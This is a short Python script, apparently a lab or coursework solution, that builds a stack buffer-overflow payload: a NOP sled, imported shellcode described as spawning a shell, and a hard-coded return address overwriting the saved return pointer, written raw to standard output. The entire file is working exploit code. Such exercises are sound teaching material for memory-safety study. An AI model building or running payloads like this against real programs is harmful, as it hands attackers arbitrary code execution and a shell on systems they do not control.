import sys
from struct import pack
from shellcode import shellcode
#53 bytes for shell
# Implement your attack here!
NOPs = b"\x90" * (1036 - len(shellcode))
returnadd = pack("<I", 0xfffe8dfa)
# Launch the attack! 
payload = NOPs + shellcode + returnadd
#print(payload)
sys.stdout.buffer.write(payload)
